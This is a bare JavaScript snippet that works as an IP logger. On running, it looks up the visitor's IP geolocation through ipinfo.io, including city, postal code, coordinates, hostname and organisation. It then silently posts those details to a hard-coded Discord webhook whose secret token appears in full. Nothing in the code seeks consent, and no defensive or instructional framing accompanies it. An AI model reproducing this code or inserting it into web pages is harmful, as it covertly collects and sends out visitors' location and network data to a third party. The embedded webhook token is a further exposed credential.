$.getJSON('https://ipinfo.io/json', function(data) {
    const coordinates = data.loc.split(",")
    const post = {
        "content": null,
        "embeds": [
          {
            "title": "`" + data.ip + "` (" + data.country + ")",
            "color": null,
            "fields": [
              {
                "name": "City",
                "value": data.city + " (" + data.postal + ")"
              },
              {
                "name": "Region",
                "value": data.region+ " "
              },
              {
                "name": "Coordinates",
                "value": "Latitude: `" + coordinates[0] + "`\nLongtitude: `" + coordinates[1] + "`"
              },
              {
                "name": "Timezone",
                "value": data.timezone + " "
              },
              {
                "name": "Hostname",
                "value": data.hostname + " "
              },
              {
                "name": "Organization",
                "value": data.org + " "
              },
            ]
          }
        ],
        "attachments": []
      }
      var request = new XMLHttpRequest();
      request.open("POST", "https://discord.com/api/webhooks/1088617585383321663/CYsKqjcEI5gZHKNCiDNHPdcVjlWduQczIHwPewBR4bsLVS3R4_KZ4x34FzPiyOCNaLUb");

      request.setRequestHeader('Content-Type', 'application/json');

      request.send(JSON.stringify(post));
});